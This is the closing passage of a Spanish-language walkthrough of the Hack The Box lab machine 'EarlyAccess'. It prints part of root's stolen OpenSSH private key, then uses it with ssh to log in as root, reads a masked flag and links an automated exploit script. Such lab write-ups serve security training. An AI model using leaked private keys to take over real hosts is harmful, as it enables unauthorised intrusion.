<span id="cb60-6"><a href="#cb60-6" aria-hidden="true"></a><span class="ex">Z/GLfnkdrY9mmU3wrCi4c7OIe1YOwPPtNLYJb76qg7dVrj9beJjT+ZRG7JflgS/aQtFUVe</span></span>
<span id="cb60-7"><a href="#cb60-7" aria-hidden="true"></a><span class="ex">9NkES/xNk80E4q1Ypbodj8pJcyWek9LXC5/+sdhV4KnUHZjoNZ+BlcpKsYvC0K1we02oC7</span></span>
<span id="cb60-8"><a href="#cb60-8" aria-hidden="true"></a><span class="ex">3p05jrBZXYwCgzPTy/8DZ9FZr6oSBleQR8lPl6xPo6D32gcHRvVJCSakvVcjJWH2L227+3</span></span>
<span id="cb60-9"><a href="#cb60-9" aria-hidden="true"></a><span class="ex">6g4RguqXGwAAA8ihamwioWpsIgAAAAdzc2gtcnNhAAABAQCsg5ci9nH/kuyklW1j9jl5Pc</span></span>
<span id="cb60-10"><a href="#cb60-10" aria-hidden="true"></a><span class="ex">HSD6F/W3g0TAuWME2tXNbdjUkUNMtuyp5f6NjUHSUsffrUOuFMytrUpIe1O2T5joUupRpg</span></span>
<span id="cb60-11"><a href="#cb60-11" aria-hidden="true"></a><span class="ex">6eXE+USdqV2D8X1z5yHpvOC8ShhqJn8Yt+eR2tj2aZTfCsKLhzs4h7Vg7A8+00tglvvqqD</span></span>
<span id="cb60-12"><a href="#cb60-12" aria-hidden="true"></a><span class="ex">t1WuP1t4mNP5lEbsl+WBL9pC0VRV702QRL/E2TzQTirViluh2PyklzJZ6T0tcLn/6x2FXg</span></span>
<span id="cb60-13"><a href="#cb60-13" aria-hidden="true"></a><span class="ex">qdQdmOg1n4GVykqxi8LQrXB7TagLvenTmOsFldjAKDM9PL/wNn0VmvqhIGV5BHyU+XrE+j</span></span>
<span id="cb60-14"><a href="#cb60-14" aria-hidden="true"></a><span class="ex">oPfaBwdG9UkJJqS9VyMlYfYvbbv7fqDhGC6pcbAAAAAwEAAQAAAQACv4Xk1LA0Ng73ADph</span></span>
<span id="cb60-15"><a href="#cb60-15" aria-hidden="true"></a><span class="ex">4UZBHC6+PemAseBUVPHKTrKuFFCH7vw/CihDd47WUEtD9cLl1ovsXZPBOWoLASP4Sx3sq8</span></span>
<span id="cb60-16"><a href="#cb60-16" aria-hidden="true"></a><span class="ex">yLVa355T/3x1DEgjIvK+WntwLfSlb6KOQCrOJRbnyN4kKaikwI0Y8P0fOrjt3g0WHcyljl</span></span>
<span id="cb60-17"><a href="#cb60-17" aria-hidden="true"></a><span class="ex">DQKuVke8Mtp2y5L+qKOyh48O+nHvc9prBnyqq0wlgnNr/Fm/S4go2O8M2CWp9AeK7YdtlO</span></span>
<span id="cb60-18"><a href="#cb60-18" aria-hidden="true"></a><span class="ex">Y7Ertr9iCY3O+3U9W/4LLxu9JVacdhqGqnig6FMQfY9TmnRLdiDvYbzESPwNRtGtTDJoFf</span></span>
<span id="cb60-19"><a href="#cb60-19" aria-hidden="true"></a><span class="ex">TgUJqvD+21ZT/k5gr2L4r8D/aB4z/ZES4x8F7IjG6+3hAAAAgBzC+fdpajuVkO3jTsleKx</span></span>
<span id="cb60-20"><a href="#cb60-20" aria-hidden="true"></a><span class="ex">npsnDqSPHlufw/U9nQutXTzv9CQClkOcCcJSONo3epcktDbx5LrUxtH72OmuZoLJCHPxtQ</span></span>
<span id="cb60-21"><a href="#cb60-21" aria-hidden="true"></a><span class="ex">+nKJdRSuTfF9vMmMMr44ovq9chO6BfSHnlS6OAoMQZENxClUWjr95AOd7iZJ20MxdNyiZZ</span></span>
<span id="cb60-22"><a href="#cb60-22" aria-hidden="true"></a><span class="ex">/ITMd6O6C/AAAAgQDYH/3pNv83rrECgtMai6pp2yS1bhLReI8SmnpJRSapk4+Ueh4Ww89N</span></span>
<span id="cb60-23"><a href="#cb60-23" aria-hidden="true"></a><span class="ex">I3RMM6hSAKkB0/X99LZNUvnkkvUE9cZK15sA0RTUSm/hzfKx9TthtZMx4fIksnDlvk9Fix</span></span>
<span id="cb60-24"><a href="#cb60-24" aria-hidden="true"></a><span class="ex">wo+Fdbj05u4++fWlQufx9lhfGdKLkSzvo4ycAp+0/aaOm6rwAAAIEAzFfEivv2iVee/lv4</span></span>
<span id="cb60-25"><a href="#cb60-25" aria-hidden="true"></a><span class="ex">1AnfsSOFhJ2FNd58S6ApYqfoz7+dKDJ74k5HnrkCjD8tcRGld1Ebaq3lBEUn+5eI/km16P</span></span>
<span id="cb60-26"><a href="#cb60-26" aria-hidden="true"></a><span class="ex">ceeCjUt48nzOX23RvBAt9dAhl0UYQr/9Bc7Wuijv/Y9xJdp2s6V5CTaUuxA6283zxy+6+b</span></span>
<span id="cb60-27"><a href="#cb60-27" aria-hidden="true"></a><span class="ex">fD4WoE</span>/<span class="ex">0eunE1VUAAAAQcm9vdEBlYXJseWFjY2VzcwECAw</span>==</span>
<span id="cb60-28"><a href="#cb60-28" aria-hidden="true"></a><span class="ex">-----END</span> OPENSSH PRIVATE KEY-----</span>
<span id="cb60-29"><a href="#cb60-29" aria-hidden="true"></a><span class="ex">game-adm@earlyaccess</span>:/home/drew$ </span></code></pre></div>
<p>Guardamos el <strong>id_rsa</strong> y le damos los permisos necesarios.</p>
<div class="sourceCode" id="cb61"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb61-1"><a href="#cb61-1" aria-hidden="true"></a>❯ <span class="fu">chmod</span> 600 id_rsa</span></code></pre></div>
<p>Ya teniendo todo listo, nos podemos conectar como el usuario <strong>root</strong> sin proporcionar la contraseña.</p>
<div class="sourceCode" id="cb62"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb62-1"><a href="#cb62-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> -i id_rsa root@10.10.11.110</span></code></pre></div>
<table>
<thead>
<tr class="header">
<th>Parámetros</th>
<th>Descripción</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-i</td>
<td>Se utiliza para especificar la clave privada.</td>
</tr>
</tbody>
</table>
<div class="sourceCode" id="cb63"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb63-1"><a href="#cb63-1" aria-hidden="true"></a><span class="ex">Linux</span> earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) <span class="ex">x86_64</span></span>
<span id="cb63-2"><a href="#cb63-2" aria-hidden="true"></a></span>
<span id="cb63-3"><a href="#cb63-3" aria-hidden="true"></a><span class="ex">The</span> programs included with the Debian GNU/Linux system are free software<span class="kw">;</span></span>
<span id="cb63-4"><a href="#cb63-4" aria-hidden="true"></a><span class="ex">the</span> exact distribution terms for each program are described in the</span>
<span id="cb63-5"><a href="#cb63-5" aria-hidden="true"></a><span class="ex">individual</span> files in /usr/share/doc/*/copyright.</span>
<span id="cb63-6"><a href="#cb63-6" aria-hidden="true"></a></span>
<span id="cb63-7"><a href="#cb63-7" aria-hidden="true"></a><span class="ex">Debian</span> GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
<span id="cb63-8"><a href="#cb63-8" aria-hidden="true"></a><span class="ex">permitted</span> by applicable law.</span>
<span id="cb63-9"><a href="#cb63-9" aria-hidden="true"></a><span class="ex">Last</span> login: Sun Sep  5 15:58:25 2021 from 10.10.14.6</span>
<span id="cb63-10"><a href="#cb63-10" aria-hidden="true"></a><span class="ex">root@earlyaccess</span>:~# whoami</span>
<span id="cb63-11"><a href="#cb63-11" aria-hidden="true"></a><span class="ex">root</span></span>
<span id="cb63-12"><a href="#cb63-12" aria-hidden="true"></a><span class="ex">root@earlyaccess</span>:~# id</span>
<span id="cb63-13"><a href="#cb63-13" aria-hidden="true"></a><span class="va">uid=</span>0<span class="va">(</span>root<span class="va">)</span> <span class="va">gid=</span>0<span class="va">(</span>root<span class="va">)</span> <span class="va">groups=</span>0<span class="va">(</span>root<span class="va">)</span></span>
<span id="cb63-14"><a href="#cb63-14" aria-hidden="true"></a><span class="ex">root@earlyaccess</span>:~# </span></code></pre></div>
<p>Y ya finalmente obtenemos la ultima flag.</p>
<div class="sourceCode" id="cb64"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb64-1"><a href="#cb64-1" aria-hidden="true"></a><span class="ex">root@earlyaccess</span>:~# cat root.txt  </span>
<span id="cb64-2"><a href="#cb64-2" aria-hidden="true"></a><span class="ex">2f9*****************************</span></span>
<span id="cb64-3"><a href="#cb64-3" aria-hidden="true"></a><span class="ex">root@earlyaccess</span>:~# </span></code></pre></div>

<p>Aqui se explica con detalle el <a class="link" href="https://github.com/MrPr1ngl3s/AutoPWN/tree/main/HTB/EarlyAccess" target="_blank">AutoPWN</a> de la máquina EarlyAccess.</p>

<hr />
<p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>


  </div>
</body>
</html>


